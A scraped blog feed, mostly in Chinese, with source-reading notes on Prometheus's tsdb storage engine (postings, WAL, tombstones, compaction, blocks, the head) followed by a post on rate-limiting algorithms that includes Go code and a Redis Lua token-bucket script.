Merge returns a new iterator over the union of the input iterators.func Merge(its ...Postings) Postings &#123; if len(its) == 0 &#123; return EmptyPostings() &#125; if len(its) == 1 &#123; return its[0] &#125; l := len(its) / 2 return newMergedPostings(Merge(its[:l]...), Merge(its[l:]...))&#125;type mergedPostings struct &#123; a, b Postings initialized bool aok, bok bool cur uint64&#125;// Without returns a new postings list that contains all elements from the full list that// are not in the drop listfunc Without(full, drop Postings) Postings &#123; return newRemovedPostings(full, drop)&#125;type removedPostings struct &#123; full, remove Postings cur uint64 initialized bool fok, rok bool&#125; 给出了几种特定类型的 Postings 123456789101112131415161718192021// EmptyPostings returns a postings list that's always empty.func EmptyPostings() Postings &#123; return emptyPostings&#125;// ErrPostings returns new postings that immediately error.func ErrPostings(err error) Postings &#123; return errPostings&#123;err&#125;&#125;// listPostings implements the Postings interface over a plain list.type listPostings struct &#123; list []uint64 cur uint64&#125;// bigEndianPostings implements the Postings interface over a byte stream of// big endian numbers.type bigEndianPostings struct &#123; list []byte cur uint32&#125; MemPostingslabel - posting idx 的映射记录器 12345678910111213// MemPostings holds postings list for series ID per label pair. They may be written// to out of order.// ensureOrder() must be called once before any reads are done. This allows for quick// unordered batch fills on startup.type MemPostings struct &#123; mtx sync.RWMutex // label 和 posting id 的关联 m map[labels.Label][]uint64 // 成功执行 EnsureOrder 之后置为 true ordered bool&#125; labelslabels 是标签, 对应 influxdb 中的 tags, 即一组键值对. 在 promethues/tsdb 中, timestamp 和 value 之外的所有信息都放在 labels 中 这个 pkg 的核心就是 Label, Labels, 以及 Labels 的 Matcher 12345678// Label is a key/value pair of strings.type Label struct &#123; Name, Value string&#125;// Labels is a sorted set of labels. Order has to be guaranteed upon// instantiation.type Labels []Label 在实际使用中, Labels 都应该是应该排序的. 因此 Labels 首先实现了 sort.Interface. 同时, Labels 之间也是可以进行比较的 12345678910111213141516171819202122// Compare compares the two label sets.// The result will be 0 if a==b, &lt;0 if a &lt; b, and &gt;0 if a &gt; b.func Compare(a, b Labels) int &#123; l := len(a) if len(b) &lt; l &#123; l = len(b) &#125; // 逐个 label 比较 name, value 的字母序 for i := 0; i &lt; l; i++ &#123; if d := strings.Compare(a[i].Name, b[i].Name); d != 0 &#123; return d &#125; if d := strings.Compare(a[i].Value, b[i].Value); d != 0 &#123; return d &#125; &#125; // If all labels so far were in common, the set with fewer labels comes first. // 可比较的部分无法确定顺序, 则比较两者长度 return len(a) - len(b)&#125; SliceSlice 是 Labels 的切片 因为 Labels 可比较, 因此 Slice 也实现了 sort.Interface Matcher1234567// Matcher specifies a constraint for the value of a label.type Matcher interface &#123; // Name returns the label name the matcher should apply to. Name() string // Matches checks whether a value fulfills the constraints. Matches(v string) bool&#125; Matcher 用来筛选 Labels 这里提供了 equal, prefix, regexp, not 四种基本的 Matcher sampleRing1234567891011121314type sample struct &#123; t int64 v float64&#125;// 既然是 Ring, 那么 buf 就是环装的, 因此有辅助的 i, f, ltype sampleRing struct &#123; delta int64 buf []sample // lookback buffer i int // position of most recent element in ring buffer f int // position of first element in ring buffer l int // number of elements in buffer&#125; sampleRing 用来处理数据点的采样 12345678910111213141516171819202122232425262728293031323334// add adds a sample to the ring buffer and frees all samples that fall// out of the delta range.func (r *sampleRing) add(t int64, v float64) &#123; l := len(r.buf) // Grow the ring buffer if it fits no more elements. if l == r.l &#123; // ring buffer 的扩容 buf := make([]sample, 2*l) copy(buf[l+r.f:], r.buf[r.f:]) copy(buf, r.buf[:r.f]) r.buf = buf r.i = r.f r.f += l &#125; else &#123; r.i++ if r.i &gt;= l &#123; r.i -= l &#125; &#125; r.buf[r.i] = sample&#123;t: t, v: v&#125; r.l++ // Free head of the buffer of samples that just fell out of the range. // 这里认为 add 是有序的, 将头部所有早于 `t - r.delta` 的数据点移出有效区域 for r.buf[r.f].t &lt; t-r.delta &#123; r.f++ if r.f &gt;= l &#123; r.f -= l &#125; r.l-- &#125;&#125; sampleRingIterator1234type sampleRingIterator struct &#123; r *sampleRing i int&#125; sampleRingIterator 是 SeriesIterator 的实现 BufferedSeriesIteratorBufferedSeriesIterator 同样也实现了 SeriesIterator, 它将一段部分数据点通过 sampleRing 缓存下来, 具体效果, 待阅读其他代码. 12345678910111213141516171819// BufferedSeriesIterator wraps an iterator with a look-back buffer.type BufferedSeriesIterator struct &#123; it tsdb.SeriesIterator buf *sampleRing lastTime int64&#125;// NewBuffer returns a new iterator that buffers the values within the time range// of the current element and the duration of delta before.// BufferedSeriesIterator 的作用是对上层 Iter 进行封装// 将其中最多 delta 时间范围内的数据点通过 sampleRing 缓存下来func NewBuffer(it tsdb.SeriesIterator, delta int64) *BufferedSeriesIterator &#123; return &amp;BufferedSeriesIterator&#123; it: it, buf: newSampleRing(delta, 16), lastTime: math.MinInt64, &#125;&#125; Seek 1234567891011121314151617181920212223242526272829// Seek advances the iterator to the element at time t or greater.// 这里的 `指针` 只会向后移动, 不会向前func (b *BufferedSeriesIterator) Seek(t int64) bool &#123; t0 := t - b.buf.delta // If the delta would cause us to seek backwards, preserve the buffer // and just continue regular advancement while filling the buffer on the way. // 此时 sampleRing 中的点都会失效, 因此直接重置 if t0 &gt; b.lastTime &#123; b.buf.reset() ok := b.it.Seek(t0) if !ok &#123; return false &#125; b.lastTime, _ = b.At() &#125; if b.lastTime &gt;= t &#123; return true &#125; for b.Next() &#123; if b.lastTime &gt;= t &#123; return true &#125; &#125; return false&#125; tombstones.goStone: Stone 是作为删除数据的标记 123456// Stone holds the information on the posting and time-range// that is deleted.type Stone struct &#123; ref uint64 intervals Intervals&#125; Interval, Intervals用来记录时间段 123456789101112131415161718// Interval represents a single time-interval.type Interval struct &#123; Mint, Maxt int64&#125;func (tr Interval) inBounds(t int64) bool &#123; return t &gt;= tr.Mint &amp;&amp; t &lt;= tr.Maxt&#125;func (tr Interval) isSubrange(dranges Intervals) bool &#123; for _, r := range dranges &#123; if r.inBounds(tr.Mint) &amp;&amp; r.inBounds(tr.Maxt) &#123; return true &#125; &#125; return false&#125; TombstoneReader1234567891011// TombstoneReader gives access to tombstone intervals by series reference.type TombstoneReader interface &#123; // Get returns deletion intervals for the series with the given reference. Get(ref uint64) (Intervals, error) // Iter calls the given function for each encountered interval. Iter(func(uint64, Intervals) error) error // Close any underlying resources Close() error&#125; 提供了一个内存版的实现 1234567891011121314151617181920212223242526272829type memTombstones map[uint64]Intervalsvar emptyTombstoneReader = memTombstones&#123;&#125;// EmptyTombstoneReader returns a TombstoneReader that is always empty.func EmptyTombstoneReader() TombstoneReader &#123; return emptyTombstoneReader&#125;func (t memTombstones) Get(ref uint64) (Intervals, error) &#123; return t[ref], nil&#125;func (t memTombstones) Iter(f func(uint64, Intervals) error) error &#123; for ref, ivs := range t &#123; if err := f(ref, ivs); err != nil &#123; return err &#125; &#125; return nil&#125;func (t memTombstones) add(ref uint64, itv Interval) &#123; t[ref] = t[ref].add(itv)&#125;func (memTombstones) Close() error &#123; return nil&#125; TombstoneReader 的内容可以被写入文件, 也可以通过文件读出. 12345678910111213141516171819202122func writeTombstoneFile(dir string, tr TombstoneReader) error &#123; path := filepath.Join(dir, tombstoneFilename) tmp := path + \".tmp\" // ... return renameFile(tmp, path)&#125;func readTombstones(dir string) (memTombstones, error) &#123; b, err := ioutil.ReadFile(filepath.Join(dir, tombstoneFilename)) // ... stonesMap := memTombstones&#123;&#125; for d.len() &gt; 0 &#123; // ... stonesMap.add(k, Interval&#123;mint, maxt&#125;) &#125; return stonesMap, nil&#125; wal.goprometheus/tsdb 会将几类数据先写入 wal (write ahead log) 文件 123456789101112131415161718192021222324252627282930// WALEntryType indicates what data a WAL entry contains.type WALEntryType uint8// Entry types in a segment file.const ( WALEntrySymbols WALEntryType = 1 WALEntrySeries WALEntryType = 2 WALEntrySamples WALEntryType = 3 WALEntryDeletes WALEntryType = 4)// WAL is a write ahead log that can log new series labels and samples.// It must be completely read before new entries are logged.type WAL interface &#123; Reader() WALReader LogSeries([]RefSeries) error LogSamples([]RefSample) error LogDeletes([]Stone) error Truncate(mint int64, keep func(uint64) bool) error Close() error&#125;// WALReader reads entries from a WAL.type WALReader interface &#123; Read( seriesf func([]RefSeries), samplesf func([]RefSample), deletesf func([]Stone), ) error&#125; 与之相关的数据结构定义如下 123456789101112131415// RefSeries is the series labels with the series ID.type RefSeries struct &#123; Ref uint64 Labels labels.Labels&#125;// RefSample is a timestamp/value pair associated with a reference to a series.type RefSample struct &#123; Ref uint64 T int64 V float64 // 基于内存的 series 数据, 在后续的阅读中再仔细分析 series *memSeries&#125; SegmentWAL这是 WAL 的一个实现, 会将数据切成 256MB 一片进行存储, 切片的组织方式与 chunks 类似. 相应的, 操作文件的相关实现代码也很相似. 12345678910111213141516171819202122232425262728293031323334// segmentFile wraps a file object of a segment and tracks the highest timestamp// it contains. During WAL truncating, all segments with no higher timestamp than// the truncation threshold can be compacted.type segmentFile struct &#123; *os.File maxTime int64 // highest tombstone or sample timpstamp in segment minSeries uint64 // lowerst series ID in segment&#125;// SegmentWAL is a write ahead log for series data.type SegmentWAL struct &#123; mtx sync.Mutex metrics *walMetrics dirFile *os.File files []*segmentFile logger log.Logger flushInterval time.Duration segmentSize int64 crc32 hash.Hash32 cur *bufio.Writer curN int64 // 信号 stopc chan struct&#123;&#125; donec chan struct&#123;&#125; // 后台执行的操作 actorc chan func() error // sequentialized background operations buffers sync.Pool&#125; LogXXXXLogSeries, LogSamples, LogDeletes 对各自的操作数据分别编码写入 WAL. Truncate12345678// Truncate deletes the values prior to mint and the series which the keep function// does not indiciate to preserve.// 用于清除不再需要的数据func (w *SegmentWAL) Truncate(mint int64, keep func(uint64) bool) error &#123; // ... return nil&#125; run通过 OpenSegmentWAL 打开一个 SegmentWAL 的时候, 会在一个独立的 goroutine 中运行 run 函数, 用来处理 actorc 传递的后台操作. 目前 actorc 传递的操作仅有文件的分片 12345678910111213141516171819202122232425262728293031323334353637// cut finishes the currently active segments and opens the next one.// The encoder is reset to point to the new segment.func (w *SegmentWAL) cut() error &#123; // Sync current head to disk and close. if hf := w.head(); hf != nil &#123; if err := w.flush(); err != nil &#123; return err &#125; // Finish last segment asynchronously to not block the WAL moving along // in the new segment. // 结束当前的切片文件 go func() &#123; w.actorc &lt;- func() error &#123; off, err := hf.Seek(0, os.SEEK_CUR) if err != nil &#123; return errors.Wrapf(err, \"finish old segment %s\", hf.Name()) &#125; if err := hf.Truncate(off); err != nil &#123; return errors.Wrapf(err, \"finish old segment %s\", hf.Name()) &#125; if err := hf.Sync(); err != nil &#123; return errors.Wrapf(err, \"finish old segment %s\", hf.Name()) &#125; if err := hf.Close(); err != nil &#123; return errors.Wrapf(err, \"finish old segment %s\", hf.Name()) &#125; return nil &#125; &#125;() &#125; // 初始化新的切片文件供写入 // ... return nil&#125; Compact.go对底层存储的压缩相关的实现 123456789101112131415// Compactor provides compaction against an underlying storage// of time series data.type Compactor interface &#123; // Plan returns a set of non-overlapping directories that can // be compacted concurrently. // Results returned when compactions are in progress are undefined. Plan(dir string) ([]string, error) // Write persists a Block into a directory. Write(dest string, b BlockReader, mint, maxt int64) (ulid.ULID, error) // Compact runs compaction against the provided directories. Must // only be called concurrently with results of Plan(). Compact(dest string, dirs ...string) (ulid.ULID, error)&#125; LeveledCompactor是 Compactor 的实现 Plan12345678910111213141516// Plan returns a list of compactable blocks in the provided directory.func (c *LeveledCompactor) Plan(dir string) ([]string, error) &#123; dirs, err := blockDirs(dir) // ... var dms []dirMeta for _, dir := range dirs &#123; // 读取 BlockMeta 作为判断是否可以 compact 的依据 meta, err := readMetaFile(dir) // ... &#125; return c.plan(dms)&#125; populateBlockLeveledCompactor.Write 和 LeveledCompactor.Compact 两个方法中都用到 LeveledCompactor.write, 而 LeveledCompactor.populateBlock 是 write 方法的重要逻辑. 其作用是将一组 Block 的数据合并, 再写入 IndexWriter, ChunkWriter. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081// populateBlock fills the index and chunk writers with new data gathered as the union// of the provided blocks. It returns meta information for the new block.func (c *LeveledCompactor) populateBlock(blocks []BlockReader, meta *BlockMeta, indexw IndexWriter, chunkw ChunkWriter) error &#123; var ( set ChunkSeriesSet allSymbols = make(map[string]struct&#123;&#125;, 1&lt;&lt;16) closers = []io.Closer&#123;&#125; ) defer func() &#123; closeAll(closers...) &#125;() // 遍历旧 block 数据 for i, b := range blocks &#123; indexr, err := b.Index() // ... chunkr, err := b.Chunks() // ... tombsr, err := b.Tombstones() // ... symbols, err := indexr.Symbols() // ... all, err := indexr.Postings(index.AllPostingsKey()) if err != nil &#123; return err &#125; all = indexr.SortedPostings(all) s := newCompactionSeriesSet(indexr, chunkr, tombsr, all) // ... // 与上一层并形成一个新的 merger set, err = newCompactionMerger(set, s) if err != nil &#123; return err &#125; &#125; // We fully rebuild the postings list index from merged series. // ... // 遍历 merger for set.Next() &#123; lset, chks, dranges := set.At() // The chunks here are not fully deleted. // Skip the series with all deleted chunks. // ... if err := chunkw.WriteChunks(chks...); err != nil &#123; return errors.Wrap(err, \"write chunks\") &#125; if err := indexw.AddSeries(i, lset, chks...); err != nil &#123; return errors.Wrap(err, \"add series\") &#125; // ... &#125; // ... s := make([]string, 0, 256) for n, v := range values &#123; // ... if err := indexw.WriteLabelIndex([]string&#123;n&#125;, s); err != nil &#123; return errors.Wrap(err, \"write label index\") &#125; &#125; for _, l := range postings.SortedKeys() &#123; if err := indexw.WritePostings(l.Name, l.Value, postings.Get(l.Name, l.Value)); err != nil &#123; return errors.Wrap(err, \"write postings\") &#125; &#125; return nil&#125; block.goBlockDelete12345678910111213141516171819202122// Delete matching series between mint and maxt in the block.// 前面说到, Delete 的时候会暂时先标记为 Tombstone, 这里即实现部分func (pb *Block) Delete(mint, maxt int64, ms ...labels.Matcher) error &#123; // ... err = pb.tombstones.Iter(func(id uint64, ivs Intervals) error &#123; for _, iv := range ivs &#123; stones.add(id, iv) pb.meta.Stats.NumTombstones++ &#125; return nil &#125;) if err != nil &#123; return err &#125; pb.tombstones = stones if err := writeTombstoneFile(pb.dir, pb.tombstones); err != nil &#123; return err &#125; return writeMetaFile(pb.dir, &amp;pb.meta)&#125; CleanTombstones 1234567891011121314151617181920212223// CleanTombstones will rewrite the block if there any tombstones to remove them// and returns if there was a re-write.func (pb *Block) CleanTombstones(dest string, c Compactor) (bool, error) &#123; numStones := 0 pb.tombstones.Iter(func(id uint64, ivs Intervals) error &#123; for _ = range ivs &#123; numStones++ &#125; return nil &#125;) if numStones == 0 &#123; return false, nil &#125; if _, err := c.Write(dest, pb, pb.meta.MinTime, pb.meta.MaxTime); err != nil &#123; return false, err &#125; return true, nil&#125; Snapshot疑问, 这里仅对目标文件夹及其内部文件做了 hardlink, 怎么确保内容不变? head.goHeadHead 向调用方提供, 用于某个时间段内的数据读写. Head 会同时处理 WAL 内的和已经持久化的数据. Head 可以认为是current Block 所有 Block 不可再写入, Head 在写入有效期过后会转化为 Block 进行持久化. Appender123456789101112131415161718192021222324// Appender returns a new Appender on the database.// 会根据具体情形决定返回的 Appender 实例// Appender 实例共两类// initAppender 会在接收到第一个数据点时初始化 Head 的起始时间// headAppender 逻辑相对简单func (h *Head) Appender() Appender &#123; h.metrics.activeAppenders.Inc() // The head cache might not have a starting point yet. The init appender // picks up the first appended timestamp as the base. if h.MinTime() == math.MinInt64 &#123; return &amp;initAppender&#123;head: h&#125; &#125; return h.appender()&#125;func (h *Head) appender() *headAppender &#123; return &amp;headAppender&#123; head: h, mint: h.MaxTime() - h.chunkRange/2, samples: h.getAppendBuffer(), highTimestamp: math.MinInt64, &#125;&#125; querier.go围绕以下三个接口, 向调用方提供查询能力. 12345678910111213141516171819202122232425262728293031// Querier provides querying access over time series data of a fixed// time range.type Querier interface &#123; // Select returns a set of series that matches the given label matchers. Select(...labels.Matcher) (SeriesSet, error) // LabelValues returns all potential values for a label name. LabelValues(string) ([]string, error) // LabelValuesFor returns all potential values for a label name. // under the constraint of another label. LabelValuesFor(string, labels.Label) ([]string, error) // Close releases the resources of the Querier. Close() error&#125;// Series exposes a single time series.type Series interface &#123; // Labels returns the complete set of labels identifying the series. Labels() labels.Labels // Iterator returns a new iterator of the data of the series. Iterator() SeriesIterator&#125;// SeriesSet contains a set of series.type SeriesSet interface &#123; Next() bool At() Series Err() error&#125; querier, blockQuerierblockQuerier 是针对一个 block 的 Querier querier 是 blockQuerier 的聚合 db.goAppenderAppender 是写入接口, *Head 就实现了 Appender 123456789101112131415161718192021222324// Appender allows appending a batch of data. It must be completed with a// call to Commit or Rollback and must not be reused afterwards.//// Operations on the Appender interface are not goroutine-safe.type Appender interface &#123; // Add adds a sample pair for the given series. A reference number is // returned which can be used to add further samples in the same or later // transactions. // Returned reference numbers are ephemeral and may be rejected in calls // to AddFast() at any point. Adding the sample via Add() returns a new // reference number. // If the reference is the empty string it must not be used for caching. Add(l labels.Labels, t int64, v float64) (uint64, error) // Add adds a sample pair for the referenced series. It is generally faster // than adding a sample by providing its full label set. AddFast(ref uint64, t int64, v float64) error // Commit submits the collected samples and purges the batch. Commit() error // Rollback rolls back all modifications made in the appender so far. Rollback() error&#125; DBDB 是向调用者提供的最主要的结构体. 1234567891011121314151617181920212223242526// DB handles reads and writes of time series falling into// a hashed partition of a seriedb.type DB struct &#123; dir string lockf *lockfile.Lockfile logger log.Logger metrics *dbMetrics opts *Options chunkPool chunkenc.Pool compactor Compactor // Mutex for that must be held when modifying the general block layout. mtx sync.RWMutex blocks []*Block head *Head compactc chan struct&#123;&#125; donec chan struct&#123;&#125; stopc chan struct&#123;&#125; // cmtx is used to control compactions and deletions. cmtx sync.Mutex compactionsEnabled bool&#125; reload 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// reload on-disk blocks and trigger head truncation if new blocks appeared. It takes// a list of block directories which should be deleted during reload.func (db *DB) reload(deleteable ...string) (err error) &#123; // ... // 读取当前所有的 block 目录 dirs, err := blockDirs(db.dir) // ... var ( blocks []*Block exist = map[ulid.ULID]struct&#123;&#125;&#123;&#125; ) for _, dir := range dirs &#123; meta, err := readMetaFile(dir) // ... // 尝试获取目录对应的 Block, 先从内存, 再从硬盘 b, ok := db.getBlock(meta.ULID) if !ok &#123; b, err = OpenBlock(dir, db.chunkPool) // ... &#125; blocks = append(blocks, b) exist[meta.ULID] = struct&#123;&#125;&#123;&#125; &#125; // 按照 Block 覆盖的时间重新排序 if err := validateBlockSequence(blocks); err != nil &#123; return errors.Wrap(err, \"invalid block sequence\") &#125; // ... // 清除不必要的 Block 文件 for _, b := range oldBlocks &#123; if _, ok := exist[b.Meta().ULID]; ok &#123; continue &#125; if err := b.Close(); err != nil &#123; level.Warn(db.logger).Log(\"msg\", \"closing block failed\", \"err\", err) &#125; if err := os.RemoveAll(b.Dir()); err != nil &#123; level.Warn(db.logger).Log(\"msg\", \"deleting block failed\", \"err\", err) &#125; &#125; // Garbage collect data in the head if the most recent persisted block // covers data of its current time range. if len(blocks) == 0 &#123; return nil &#125; maxt := blocks[len(blocks)-1].Meta().MaxTime return errors.Wrap(db.head.Truncate(maxt), \"head truncate failed\")&#125; runrun 方法在 Open 时被调用, 在一个单独的 goroutine 中执行, 主要是定期对数据进行压缩以节省空间 1234567891011121314151617181920212223242526func (db *DB) run() &#123; defer close(db.donec) backoff := time.Duration(0) for &#123; select &#123; case &lt;-db.stopc: return case &lt;-time.After(backoff): &#125; select &#123; case &lt;-time.After(1 * time.Minute): select &#123; case db.compactc &lt;- struct&#123;&#125;&#123;&#125;: default: &#125; case &lt;-db.compactc: // 执行压缩相关代码 case &lt;-db.stopc: return &#125; &#125;&#125; Appender返回的是封装的结果 dbAppender, 后面专门再分析 Qurier返回的是所有指定时间范围内的 Block 聚合 12345678910111213141516171819202122232425262728293031323334353637383940// Querier returns a new querier over the data partition for the given time range.// A goroutine must not handle more than one open Querier.func (db *DB) Querier(mint, maxt int64) (Querier, error) &#123; var blocks []BlockReader db.mtx.RLock() defer db.mtx.RUnlock() for _, b := range db.blocks &#123; m := b.Meta() // 找出符合时间段的 block if intervalOverlap(mint, maxt, m.MinTime, m.MaxTime) &#123; blocks = append(blocks, b) &#125; &#125; // 前面提到, Head 可以视作当前 Block if maxt &gt;= db.head.MinTime() &#123; blocks = append(blocks, db.head) &#125; // Block 的聚合 sq := &amp;querier&#123; blocks: make([]Querier, 0, len(blocks)), &#125; for _, b := range blocks &#123; q, err := NewBlockQuerier(b, mint, maxt) if err == nil &#123; sq.blocks = append(sq.blocks, q) continue &#125; // If we fail, all previously opened queriers must be closed. for _, q := range sq.blocks &#123; q.Close() &#125; return nil, errors.Wrapf(err, \"open querier for block %s\", b) &#125; return sq, nil&#125; Delete这边实际会将 Delete 操作分给各个受影响的 Block CleanTombstone前面提到, 各个 Block Delete 内的逻辑实际是写 WAL 以及 Tombstone 文件 这里会对当前所有 Block 真正进行清理, 然后调用 reload 方法. dbAppender是对 *headAppender 的封装, 在 Commit 的时候触发 compact 12345678910111213141516171819202122232425// Appender opens a new appender against the database.func (db *DB) Appender() Appender &#123; return dbAppender&#123;db: db, Appender: db.head.Appender()&#125;&#125;// dbAppender wraps the DB's head appender and triggers compactions on commit// if necessary.type dbAppender struct &#123; Appender db *DB&#125;func (a dbAppender) Commit() error &#123; err := a.Appender.Commit() // We could just run this check every few minutes practically. But for benchmarks // and high frequency use cases this is the safer way. if a.db.head.MaxTime()-a.db.head.MinTime() &gt; a.db.head.chunkRange/2*3 &#123; select &#123; case a.db.compactc &lt;- struct&#123;&#125;&#123;&#125;: default: &#125; &#125; return err&#125; Summaryprometheus/tsdb (下称 ptsdb ) 的结构体之间的层次大概可以这样划分: DB: 对外提供的核心对象 Block 已经持久化的, 覆盖某个时间段的时序数据. Block 的 Index: 用于保存 labels 的索引数据 Chunk: 用于保存时间戳-采样值 数据 Head: 由于 ptsdb 规定, 数据必须增序写入, 已经持久化的 Block 不能再写入, 因此一个时刻只会有一个可供写入的 Block, 即 Head. Head 同时还承担记录删除动作的任务 WAL 增删改的动作都会先进入 WAL, 供后续恢复用 Tombstone: 用于标记删除动作, 被标记的数据在 compact 的时候统一清理 Compactor: 对文件进行压缩. Block 数据的组织参考了 LSM, 因此 Compactor 的实现也和基于 LSM 的 kv db 类似. 关于 ptsdb, 时间序列数据的存储和计算 - 开源时序数据库解析（四） 这篇文章有更宏观的阐述, 可以参考. 参考资料https://zhuanlan.zhihu.com/p/60212547","categories":[{"name":"tsdb","slug":"tsdb","permalink":"http://www.yorzorzy.xyz/categories/tsdb/"}],"tags":[{"name":"tsdb","slug":"tsdb","permalink":"http://www.yorzorzy.xyz/tags/tsdb/"}]},{"title":"分布式限流算法","slug":"分布式限流算法","date":"2020-09-29T05:02:43.111Z","updated":"2020-09-29T03:51:34.000Z","comments":true,"path":"2020/09/29/分布式限流算法/","link":"","permalink":"http://www.yorzorzy.xyz/2020/09/29/%E5%88%86%E5%B8%83%E5%BC%8F%E9%99%90%E6%B5%81%E7%AE%97%E6%B3%95/","excerpt":"","text":"分布式限流算法介绍介绍汇总一些常用到的限流算法和代码实现。方便后续开发使用。常用的限流算法： 计数器，令牌桶，漏桶。 计数器算法采用计数器实现限流有点简单粗暴，一般我们会限制一秒钟的能够通过的请求数，比如限流qps为100，算法的实现思路就是从第一个请求进来开始计时，在接下去的1s内，每来一个请求，就把计数加1，如果累加的数字达到了100，那么后续的请求就会被全部拒绝。等到1s结束后，把计数恢复成0，重新开始计数。 具体的实现可以是这样的：对于每次服务调用，可以通过 AtomicLong#incrementAndGet()方法来给计数器加1并返回最新值，通过这个最新值和阈值进行比较。 漏桶算法为了消除”突刺现象”，可以采用漏桶算法实现限流，漏桶算法这个名字就很形象，算法内部有一个容器，类似生活用到的漏斗，当请求进来时，相当于水倒入漏斗，然后从下端小口慢慢匀速的流出。不管上面流量多大，下面流出的速度始终保持不变。 在算法实现方面，可以准备一个队列，用来保存请求，另外通过一个线程池定期从队列中获取请求并执行，可以一次性获取多个并发执行。 这种算法，在使用过后也存在弊端：无法应对短时间的突发流量。 令牌桶令牌桶算法是对漏桶算法的一种改进，桶算法能够限制请求调用的速率，而令牌桶算法能够在限制调用的平均速率的同时还允许一定程度的突发调用。 在令牌桶算法中，存在一个桶，用来存放固定数量的令牌。算法中存在一种机制，以一定的速率往桶中放令牌。每次请求调用需要先获取令牌，只有拿到令牌，才有机会继续执行，否则选择选择等待可用的令牌、或者直接拒绝。 放令牌这个动作是持续不断的进行，如果桶中令牌数达到上限，就丢弃令牌，所以就存在这种情况，桶中一直有大量的可用令牌，这时进来的请求就可以直接拿到令牌执行，比如设置qps为100，那么限流器初始化完成一秒后，桶中就已经有100个令牌了，这时服务还没完全启动好，等启动完成对外提供服务时，该限流器可以抵挡瞬时的100个请求。所以，只有桶中没有令牌时，请求才会进行等待，最后相当于以一定的速率执行。 实现思路：可以准备一个队列，用来保存令牌，另外通过一个线程池定期生成令牌放到队列中，每来一个请求，就从队列中获取一个令牌，并继续执行。 1234567891011121314151617181920type RateLimiter struct &#123; Capacity int64 LeakingRate float64 Tokens int64 LastLeakTime int64&#125;func (rl *RateLimiter) Allow() bool &#123; now := time.Now().Unix() supplyToken = rl.Tokens + (now - rl.LastLeakTime) * rl.LeakingRate rl.Tokens = min(rl.Capacity, supplyToken) rl.LastLeakTime = now if rl.Tokens &gt; 1 &#123; rl.Tokens-- return true &#125; return false&#125; 集群限流为了控制访问次数，肯定需要一个计数器，而且这个计数器只能保存在第三方服务，比如redis。 每次有相关操作的时候，就向redis服务器发送一个incr命令，比如需要限制某个用户访问/index接口的次数，只需要拼接用户id和接口名生成redis的key，每次该用户访问此接口时，只需要对这个key执行incr命令，在这个key带上过期时间，就可以实现指定时间的访问频率。 redis + lua实现: lua脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475--- 获取令牌桶local funnel = redis.call(\"HMGET\", KEYS[1], 'capacity', 'leaking_rate', 'tokens', 'subfunnel_capacity', 'subfunnel_rate', 'last_leak_time')--- 没有拿到限流配置，放行if funnel[1] == nil then return 0endlocal capacity = tonumber(funnel[1]) --- capacity 容量local leaking_rate = tonumber(funnel[2]) --- leaking_rate 令牌桶添加令牌速率local tokens = tonumber(funnel[3]) --- tokens 剩余容量local subfunnel_capacity = tonumber(funnel[4]) --- subfunnel_capacity 子桶容量local subfunnel_rate = tonumber(funnel[5]) --- subfunnel_rate 子桶添加令牌速率local last_leak_time = tonumber(funnel[6]) --- last_leak_time 最后访问时间戳--- 容量小于等于0，放行if (capacity &lt;= 0) then return 0endlocal now = tonumber(ARGV[1]) --- 获取时间戳local subfunnel_name = ARGV[2] --- 获取限流子桶Namelocal req_token = tonumber(ARGV[3]) --- 请求获取令牌数量--- 计算需要补充的令牌local supply_token = (now - last_leak_time) * leaking_rateif (supply_token &gt; 0) then last_leak_time = now tokens = math.min(supply_token + tokens, capacity)endlocal result = 1 --- 默认不能取得令牌--- 判断总桶if (tokens &gt;= req_token) then result = 0--- 判断子桶 if (string.len(subfunnel_name) &gt; 0 and subfunnel_capacity &gt; 0) then local subkey = KEYS[1]..\":subfunnel\" local free_field = subfunnel_name..':tokens' local last_field = subfunnel_name..':last_leak_time' local subfunnel = redis.pcall('HMGET', subkey, free_field, last_field) local sub_free, sub_last = subfunnel_capacity, now if (subfunnel[1]) then sub_free = tonumber(subfunnel[1]) end if (subfunnel[2]) then sub_last = tonumber(subfunnel[2]) end local sub_supply = (now - sub_last) * subfunnel_rate --- 计算子桶补充令牌数 if (sub_supply &gt; 0) then sub_last = now sub_free = math.min(sub_supply + sub_free, subfunnel_capacity) end if (sub_free &gt;= req_token) then sub_free = sub_free - req_token tokens = tokens - req_token else result = 2 end redis.pcall('HMSET', subkey, free_field, sub_free, last_field, sub_last) --- 更新子桶 else tokens = tokens - req_token endendredis.call('HMSET', KEYS[1], \"last_leak_time\", last_leak_time, \"tokens\", tokens) --- 更新桶return last_leak_time * 10 + result go 12345678910111213141516171819202122232425func CheckFunnel(client *redis.Client, key string, subFunnel string, count int) (reqTime int64, isLimit bool, err error) &#123; reqTime = MakeTimestamp() // applyToken is *redis.Script res, err := applyToken.Run(client, []string&#123;key&#125;, reqTime, subFunnel, count).Int64() if err != nil &#123; return reqTime, false, err &#125; retCode := res % 10 isLimit = bool(retCode == 0) switch retCode &#123; // case retCode and set err case 0: err = nil &#125; return&#125;func Allow(client *redis.Client, key string, subFunnel string) (isLimit bool) &#123; _, isLimit, _ = CheckFunnel(client, key, subFunnel, 1) return&#125; 速率控制： MakeRate函数 123func MakeRate(capacity int64, duration time.Duration) float64 &#123; return float64(capacity) * float64(time.Millisecond) / float64(duration) // to req/ms&#125; 传入当前时间 123func MakeTimestamp() int64 &#123; return time.Now().UnixNano() / int64(time.Millisecond)&#125; srTCM和trTCMstTCMsrTCM的英文全称是Single Rate Three Color Marker，单速率三颜色标记 需要预先设定三个参数： Committed Information Rate(CIR)，提交信息率。 Committed Burst Size(CBS)，提交Burst大小。 Excess Burst Size(EBS)，超量Burst大小。 CIR用于表示每秒IP包的字节数，header包括在内 CBS和EBS以字节为单位。必须被设置。推荐值：它们之一必须大于0，且若大于0的CBS和EBS，值要大于MTU。 颜色有三种：绿、黄、红。简单来说，颜色与参数的对应关系是这样的： 如果没有超过CBS就是绿的。 超过了CBS但没有超过EBS就是黄的。 超过了EBS就是红的。 算法流程： 12345678 +------------+ | Result | | V +-------+ +--------+ | | | |Packet Stream ===&gt;| Meter |===&gt;| Marker |===&gt; Marked Stream | | | | +-------+ +--------+ Meter（限速器）用于限速 Marker收到的是每一个packet和其对应的结果值，根据计算结果在所有packet的IP header的DS field中标记上不同的“颜色” Meter 使用两个令牌桶实现。 